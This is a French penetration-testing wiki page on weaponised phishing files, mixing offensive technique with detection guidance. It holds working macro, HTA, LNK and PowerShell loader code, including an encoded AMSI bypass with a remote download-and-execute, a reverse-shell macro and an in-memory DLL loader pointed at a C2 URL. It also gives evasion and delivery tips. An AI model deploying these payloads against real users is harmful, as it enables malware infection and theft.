# Fichiers et documents de phishing

{{#include ../../banners/hacktricks-training.md}}

## Documents Office

Microsoft Word valide les données du fichier avant de l’ouvrir. Cette validation consiste à identifier la structure des données conformément à la norme OfficeOpenXML. Si une erreur survient lors de l’identification de la structure des données, le fichier analysé ne sera pas ouvert.

En général, les fichiers Word contenant des macros utilisent l’extension `.docm`. Cependant, il est possible de renommer le fichier en modifiant son extension tout en conservant la capacité d’exécuter les macros.\
Par exemple, un fichier RTF ne prend pas en charge les macros par conception, mais un fichier DOCM renommé en RTF sera traité par Microsoft Word et pourra exécuter des macros.\
Les mêmes mécanismes internes s’appliquent à tous les logiciels de la suite Microsoft Office (Excel, PowerPoint, etc.).

Vous pouvez utiliser la commande suivante pour vérifier quelles extensions seront exécutées par certains programmes Office :

```bash
assoc | findstr /i "word excel powerp"
```

Les fichiers DOCX faisant référence à un modèle distant (Fichier – Options – Compléments – Gérer : Modèles – Atteindre) qui contient des macros peuvent également « exécuter » des macros.

### Chargement d’image externe

Allez dans : _Insertion --> Quick Parts --> Champ_\
_**Catégories** : Liens et références, **Noms de champ** : includePicture, et **Nom de fichier ou URL** :_ http://<ip>/whatever

![Documents Office - Chargement d’image externe : allez dans Insertion -- Quick Parts -- Champ](<../../images/image (155).png>)

### Porte dérobée par macros

Il est possible d’utiliser des macros pour exécuter du code arbitraire depuis le document.

#### Fonctions de chargement automatique

Plus elles sont courantes, plus il est probable que l’AV les détecte.

- AutoOpen()
- Document_Open()

#### Exemples de code de macros

```vba
Sub AutoOpen()
    CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

  Dim Shell As Object
  Set Shell = CreateObject("wscript.shell")
  Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
 .StdIn.WriteLine author
 .StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```

#### Supprimer manuellement les métadonnées

Allez dans **File > Info > Inspect Document > Inspect Document** pour ouvrir l’inspecteur de document. Cliquez sur **Inspect**, puis sur **Remove All** à côté de **Document Properties and Personal Information**.

#### Extension de document

Une fois terminé, sélectionnez la liste déroulante **Save as type** et remplacez le format **`.docx`** par **Word 97-2003 `.doc`**.\
Faites-le parce que vous **ne pouvez pas enregistrer de macros dans un fichier `.docx`** et qu’il existe une **stigmatisation** **autour** de l’extension **`.docm`**, qui prend en charge les macros (par exemple, son icône de vignette comporte un grand `!`, et certaines passerelles web/e-mail les bloquent entièrement). Par conséquent, cette **ancienne extension `.doc` est le meilleur compromis**.

#### Générateurs de macros malveillantes

- MacOS
  - [**macphish**](https://github.com/cldrn/macphish)
  - [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## Macros à exécution automatique LibreOffice ODT (Basic)

Les documents LibreOffice Writer peuvent intégrer des macros Basic et les exécuter automatiquement à l’ouverture du fichier en associant la macro à l’événement **Open Document** (Tools → Customize → Events → Open Document → Macro…).<sup>[[1]](#references)</sup> Voici à quoi ressemble une simple macro reverse shell :

```vb
Sub Shell
    Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```

Notez les guillemets doublés (`""`) dans la chaîne : LibreOffice Basic les utilise pour échapper les guillemets littéraux. Ainsi, les payloads qui se terminent par `...==""")` gardent équilibrés à la fois la commande interne et l’argument de Shell.

Conseils de livraison :

- Enregistrez le fichier au format `.odt` et associez la macro à l’événement du document afin qu’elle s’exécute dès l’ouverture.
- Pour envoyer un e-mail avec `swaks`, utilisez `--attach @resume.odt` (le `@` est requis pour joindre les octets du fichier, plutôt que la chaîne correspondant à son nom). C’est essentiel lorsque vous exploitez des serveurs SMTP qui acceptent des destinataires `RCPT TO` arbitraires sans validation.

## Fichiers HTA

Un HTA est un programme Windows qui **combine HTML et des langages de script (tels que VBScript et JScript)**. Il génère l’interface utilisateur et s’exécute comme une application « pleinement fiable », sans les contraintes du modèle de sécurité d’un navigateur.

Un HTA s’exécute avec **`mshta.exe`**, généralement **installé** avec **Internet Explorer**, ce qui rend **`mshta` dépendant d’IE**. S’il a été désinstallé, les HTA ne pourront donc pas s’exécuter.

```html
<--! Basic HTA Execution -->
<html>
  <head>
    <title>Hello World</title>
  </head>
  <body>
    <h2>Hello World</h2>
    <p>This is an HTA...</p>
  </body>

  <script language="VBScript">
    Function Pwn()
      Set shell = CreateObject("wscript.Shell")
      shell.run "calc"
    End Function

    Pwn
  </script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
  Function var_func()
  	var_shellcode = "<shellcode>"

  	Dim var_obj
  	Set var_obj = CreateObject("Scripting.FileSystemObject")
  	Dim var_stream
  	Dim var_tempdir
  	Dim var_tempexe
  	Dim var_basedir
  	Set var_tempdir = var_obj.GetSpecialFolder(2)
  	var_basedir = var_tempdir & "\" & var_obj.GetTempName()
  	var_obj.CreateFolder(var_basedir)
  	var_tempexe = var_basedir & "\" & "evil.exe"
  	Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
  	For i = 1 to Len(var_shellcode) Step 2
  	    var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
  	Next
  	var_stream.Close
  	Dim var_shell
  	Set var_shell = CreateObject("Wscript.Shell")
  	var_shell.run var_tempexe, 0, true
  	var_obj.DeleteFile(var_tempexe)
  	var_obj.DeleteFolder(var_basedir)
  End Function

  var_func
  self.close
</script>
```

## Forcer l’authentification NTLM

Il existe plusieurs façons de **forcer l’authentification NTLM « à distance »**. Par exemple, vous pouvez ajouter des **images invisibles** aux e-mails ou au HTML auquel l’utilisateur accédera (même via un HTTP MitM ?). Vous pouvez aussi envoyer à la victime **l’adresse de fichiers** qui **déclencheront** une **authentification** dès qu’elle **ouvrira le dossier**.

**Découvrez ces idées et d’autres encore dans les pages suivantes :**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

N’oubliez pas que vous pouvez non seulement voler le hash ou les identifiants, mais aussi **effectuer des attaques NTLM relay** :

- [**Attaques NTLM Relay**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay vers des certificats)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## Loaders LNK + payloads intégrés à un ZIP (chaîne fileless)

Les campagnes très efficaces distribuent un ZIP contenant deux documents leurres légitimes (PDF/DOCX) et un fichier .lnk malveillant. L’astuce consiste à stocker le loader PowerShell réel dans les octets bruts du ZIP, après un marqueur unique ; le fichier .lnk l’extrait et l’exécute entièrement en mémoire.<sup>[[2]](#references)</sup>

Déroulement classique mis en œuvre par la commande PowerShell en une ligne du fichier .lnk :

1) Rechercher le ZIP d’origine dans les emplacements courants : Bureau, Téléchargements, Documents, %TEMP%, %ProgramData% et le répertoire parent du répertoire de travail actuel.
2) Lire les octets du ZIP et rechercher un marqueur codé en dur (p. ex., xFIQCV). Tout ce qui suit le marqueur constitue le payload PowerShell intégré.
3) Copier le ZIP dans %ProgramData%, l’extraire à cet emplacement et ouvrir le fichier .docx leurre pour paraître légitime.
4) Contourner AMSI pour le processus actuel : [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Désobfusquer l’étape suivante (p. ex., supprimer tous les caractères #) et l’exécuter en mémoire.

Exemple de squelette PowerShell pour extraire et exécuter l’étape intégrée :

```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
  "$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
  "$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```

Notes
- La livraison abuse souvent de sous-domaines PaaS réputés (p. ex., *.herokuapp.com) et peut filtrer l’accès aux payloads (servir des ZIP bénins en fonction de l’IP/UA).
- L’étape suivante déchiffre fréquemment du shellcode encodé en base64/XOR et l’exécute via Reflection.Emit + VirtualAlloc afin de réduire au minimum les artefacts sur disque.

Persistance utilisée dans la même chaîne
- Détournement de COM TypeLib du contrôle Microsoft Web Browser, afin qu’IE/Explorer ou toute application l’intégrant relance automatiquement le payload.<sup>[[2]](#references)[[4]](#references)</sup> Voir les détails et les commandes prêtes à l’emploi ici :

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Chasse aux menaces/IOCs
- Fichiers ZIP contenant la chaîne marqueur ASCII (p. ex., xFIQCV) ajoutée aux données de l’archive.
- Fichier .lnk qui parcourt les dossiers parents/de l’utilisateur pour localiser le ZIP et ouvrir un document leurre.
- Manipulation d’AMSI via [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Longs fils de discussion professionnels se terminant par des liens hébergés sur des domaines PaaS de confiance.

## Mise en scène avec leurre LNK d’abord → persistance par tâche planifiée → side-loading CPL de confiance

Un autre schéma récurrent repose sur un **`.lnk` imitant un document**, qui ouvre immédiatement un leurre inoffensif tout en préparant la véritable chaîne en arrière-plan.<sup>[[3]](#references)</sup>

Flux observé :
1. Le raccourci **se fait passer pour un PDF** et utilise `conhost.exe` ou un proxy similaire pour lancer un téléchargeur PowerShell obfusqué.
2. PowerShell fragmente les tokens évidents (`iw''r`, `g''c''i`, `r''e''n`, `c''p''i`, `&(g''cm sch*)`) afin que les détections naïves recherchant `iwr`, `gci`, `ren`, `cpi` ou `schtasks` ne repèrent pas la commande.
3. Le stager télécharge **d’abord le document leurre**, l’ouvre pour la victime, puis reconstitue les fichiers malveillants en arrière-plan.
4. Les payloads peuvent être écrits avec des **extensions factices**, puis renommés en supprimant des caractères de remplissage, retardant ainsi l’apparition d’artefacts évidents `.exe` / `.cpl`.
5. La persistance est établie avec une **tâche planifiée exécutée toutes les minutes**, qui lance un binaire hôte de confiance depuis un chemin accessible en écriture par l’utilisateur.

Indices minimaux de chasse aux menaces pour ce schéma :

```powershell
# Suspicious split-token PowerShell seen in LNK chains
iw''r
r''e''n
&(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
```

Une disposition de staging utile à reconnaître est :
- `C:\Users\Public\<decoy>.pdf`
- `C:\Users\Public\<trusted>.exe`
- `C:\Users\Public\<malicious>.cpl` ou `.dll`
- `C:\Windows\Tasks\<blob>.dat`

### Pourquoi le deuxième stage est furtif

Dans l’étude de cas de Rapid7, la tâche planifiée lançait régulièrement **`Fondue.exe`** depuis `C:\Users\Public\`. Comme **`APPWIZ.cpl`** avait été placé à côté et exportait **`RunFODW`**, le binaire Microsoft de confiance chargeait le CPL de l’attaquant en side-loading au lieu de la copie système légitime.

Le CPL :
- Lit un blob **AES-256-CBC** depuis `C:\Windows\Tasks\editor.dat`
- Le déchiffre via **Windows CNG / `bcrypt.dll`**
- Alloue de la mémoire exécutable et y copie le shellcode déchiffré
- L’exécute indirectement en passant le pointeur vers le shellcode comme callback de **`EnumUILanguagesW`**

Cette dernière étape mérite d’être recherchée séparément : les malwares évitent souvent un saut direct `((void(*)())buf)()` et abusent plutôt d’une **WinAPI légitime acceptant un callback** pour transférer l’exécution.

La charge utile déchiffrée dans cette campagne était du shellcode **Donut**, qui a ensuite mappé le PE final entièrement en mémoire et patché **AMSI/WLDP/ETW** dans le processus courant avant de transmettre l’exécution. Pour en savoir plus sur le side-loading et le post-traitement en mémoire, consultez :

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
{{#endref}}

{{#ref}}
../../windows-hardening/av-bypass.md
{{#endref}}

Pistes pratiques pour la détection :
- Un `.lnk` qui lance `powershell.exe` ou `conhost.exe`, suivi de l’affichage d’un document leurre.
- Des téléchargements de courte durée vers **`C:\Users\Public\`**, suivis du renommage immédiat de fichiers portant des extensions fantaisistes.
- Des tâches planifiées aux noms anodins, comme `GoogleErrorReport`, exécutées depuis des **répertoires accessibles en écriture par l’utilisateur**.
- Des binaires de confiance chargeant des fichiers **`.cpl` / `.dll`** depuis le même répertoire non système.
- Des blobs texte Base64 écrits sous **`C:\Windows\Tasks\`**, puis lus par le module chargé en side-loading.

## Charges utiles délimitées par stéganographie dans des images (stager PowerShell)

Les chaînes de loader récentes livrent un JavaScript/VBS obfusqué qui décode et exécute un stager PowerShell en Base64. Ce stager télécharge une image (souvent un GIF) contenant une DLL .NET encodée en Base64 et dissimulée en texte brut entre des marqueurs uniques de début et de fin. Le script recherche ces délimiteurs (exemples observés dans la nature : «<<sudo_png>> … <<sudo_odt>>>»), extrait le texte situé entre eux, le décode en Base64 en octets, charge l’assembly en mémoire et invoque une méthode d’entrée connue en lui passant l’URL C2.<sup>[[5]](#references)</sup>

Flux de travail
- Stage 1 : dropper JS/VBS archivé → décode le Base64 intégré → lance le stager PowerShell avec -nop -w hidden -ep bypass.
- Stage 2 : le stager PowerShell → télécharge l’image, extrait le Base64 délimité par les marqueurs, charge la DLL .NET en mémoire et appelle sa méthode (par ex. VAI) en lui passant l’URL C2 et les options.
- Stage 3 : le loader récupère la charge utile finale et l’injecte généralement via le process hollowing dans un binaire de confiance (souvent MSBuild.exe).<sup>[[7]](#references)[[8]](#references)</sup> Pour en savoir plus sur le process hollowing et l’exécution proxy via des utilitaires de confiance, consultez :

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

Exemple PowerShell pour extraire une DLL d’une image et invoquer une méthode .NET en mémoire :

<details>
<summary>Extracteur et loader de charge utile stéganographique PowerShell</summary>

```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
  [string]$Url    = 'https://example.com/payload.gif',
  [string]$StartM = '<<sudo_png>>',
  [string]$EndM   = '<<sudo_odt>>',
  [string]$EntryType = 'Loader',
  [string]$EntryMeth = 'VAI',
  [string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```

</details>

Notes
- Il s’agit de ATT&CK T1027.003 (stéganographie/masquage de marqueurs).<sup>[[6]](#references)</sup> Les marqueurs varient d’une campagne à l’autre.
- Le bypass d’AMSI/ETW et la désobfuscation des chaînes sont couramment appliqués avant le chargement de l’assembly.
- Recherche de menaces : analyser les images téléchargées à la recherche de délimiteurs connus ; repérer PowerShell accédant à des images et décodant immédiatement des blobs Base64.

Voir aussi les outils stego et les techniques d’extraction :

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## Droppers JS/VBS → staging PowerShell Base64

Une étape initiale récurrente est un petit fichier `.js` ou `.vbs`, fortement obfusqué, distribué dans une archive. Son seul objectif est de décoder une chaîne Base64 intégrée et de lancer PowerShell avec `-nop -w hidden -ep bypass` afin d’amorcer le téléchargement de l’étape suivante via HTTPS.<sup>[[5]](#references)</sup>

Logique schématique (abstraite) :
- Lire le contenu de son propre fichier
- Repérer un blob Base64 entre des chaînes leurres
- Décoder en code PowerShell ASCII
- Exécuter avec `wscript.exe`/`cscript.exe` en invoquant `powershell.exe`

Indices de recherche
- Pièces jointes JS/VBS archivées lançant `powershell.exe` avec `-enc`/`FromBase64String` dans la ligne de commande.
- `wscript.exe` lançant `powershell.exe -nop -w hidden` depuis des répertoires temporaires utilisateur.

## Documents MSC comme conteneurs d’exécution (GrimResource)

Les fichiers Microsoft Management Console (`.msc`) sont des définitions de console XML normalement ouvertes par `mmc.exe`. **GrimResource** exploite une référence `StringTable` vers une ressource `apds.dll` contenant une ancienne primitive XSS ; ainsi, lorsqu’un utilisateur ouvre la console conçue à cet effet, du JavaScript s’exécute dans `mmc.exe`. Les échantillons observés combinaient une obfuscation basée sur `transformNode` avec **DotNetToJScript** pour instancier une charge utile .NET sans passer par le chemin habituel des macros Office.<sup>[[9]](#references)</sup>

Pour le triage statique, traitez un fichier MSC non fiable comme du texte et ne double-cliquez **pas** dessus :<sup>[[9]](#references)</sup>

```bash
file lure.msc
xmllint --format lure.msc > lure.formatted.xml
grep -Eina 'apds\.dll|res://|StringTable|transformNode|ActiveXObject|FromBase64String' lure.formatted.xml
strings -el lure.msc | grep -Ei 'powershell|cmd\.exe|http|base64'
```

Les pivots d’exécution à forte valeur de signal sont le chargement du CLR ou de composants de script par `mmc.exe`, la création de connexions réseau, ou le lancement de `powershell.exe`, `cmd.exe`, `wscript.exe`, `cscript.exe`, `mshta.exe`, `rundll32.exe` ou d’un exécutable inattendu. Le format est légitime : les détections devraient donc corréler **l’origine + un contenu XML/script suspect + le comportement de `mmc.exe`**, plutôt que de bloquer tous les fichiers MSC.<sup>[[9]](#references)</sup>

## Redirections par PDF/QR et contrôle des charges utiles

Un PDF n’a pas besoin d’exploiter une vulnérabilité pour être utile. Des campagnes récentes intègrent un **code QR ou un lien ordinaire** dans un document d’apparence anodine, font sortir la session du navigateur des contrôles de messagerie et personnalisent la destination avec l’adresse du destinataire. Microsoft a documenté en 2025 des PDF dont les URL de QR étaient uniques pour chaque destinataire et menaient à une infrastructure de collecte d’identifiants RaccoonO365 ; une chaîne parallèle utilisait un filtrage selon l’adresse IP et l’environnement pour fournir un chemin JavaScript/MSI à certains visiteurs, mais un PDF inoffensif aux scanners ou aux clients non autorisés.<sup>[[10]](#references)</sup>

Examinez à la fois les actions du PDF et les codes QR rendus. Un QR peut être dessiné en vecteurs plutôt qu’enregistré comme image extractible ; rasterisez donc chaque page en plus d’extraire les images intégrées :

```bash
pdfid.py lure.pdf
pdfdetach -list lure.pdf
qpdf --qdf --object-streams=disable lure.pdf expanded.pdf
grep -aE '/(URI|OpenAction|AA|Launch|EmbeddedFile)|https?://' expanded.pdf
pdfimages -png lure.pdf image
pdftoppm -png -r 300 lure.pdf page
zbarimg --quiet image-*.png page-*.png
```

Inspectez les destinations décodées et les redirections depuis un système d’analyse isolé, sans vous authentifier. Parmi les caractéristiques utiles à rechercher : des PDF contenant uniquement un QR code associés à des e-mails presque vides, l’adresse e-mail du destinataire intégrée à un paramètre de requête, plusieurs redirections passant par des services d’hébergement réputés, et des contenus différents selon l’adresse IP, la géolocalisation, les cookies, le référent ou l’agent utilisateur. Comparez les requêtes à l’aide de profils contrôlés, car une seule récupération depuis un sandbox peut ne renvoyer que le leurre.<sup>[[10]](#references)</sup>

## Fichiers Windows pour voler des hashes NTLM

Consultez la page sur les **endroits où voler des identifiants NTLM** :

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}




## References

- [1] [HTB Job – Macro LibreOffice → webshell IIS → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [2] [Check Point Research – Campagne ZipLine : une attaque de phishing sophistiquée ciblant des entreprises américaines](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Rapid7 – Malware à la mode : suivi des techniques de Dropping Elephant à travers une chaîne de loaders sur le thème de la Chine](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
- [4] [Détournement de la TypeLib – Nouvelle technique de persistance COM (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [5] [Unit 42 – Le loader PhantomVAI diffuse divers infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [6] [MITRE ATT&CK – Stéganographie (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [7] [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [8] [MITRE ATT&CK – Exécution par proxy via des utilitaires de développeur de confiance : MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)
- [9] [Elastic Security Labs – GrimResource : Microsoft Management Console pour l’accès initial et l’évasion](https://www.elastic.co/security-labs/threat-command/grimresource)
- [10] [Microsoft Security Blog – Des acteurs malveillants profitent de la période des déclarations fiscales pour déployer des campagnes de phishing sur le thème des impôts](https://www.microsoft.com/en-us/security/blog/2025/04/03/threat-actors-leverage-tax-season-to-deploy-tax-themed-phishing-campaigns/)
{{#include ../../banners/hacktricks-training.md}}
